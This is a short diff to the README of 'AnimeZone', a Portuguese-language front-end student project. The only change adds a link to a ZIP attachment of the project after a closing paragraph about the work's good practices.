@@ -85,4 +85,5 @@ animezone/
 O projeto **AnimeZone** foi desenvolvido com foco em boas práticas de programação front-end. Todos os requisitos da atividade foram implementados com organização, clareza de código e foco na experiência do usuário.
 
 ---
+[projeto animezone-mapa.ZIP](https://github.com/user-attachments/files/21028525/projeto.animezone-mapa.ZIP)
 
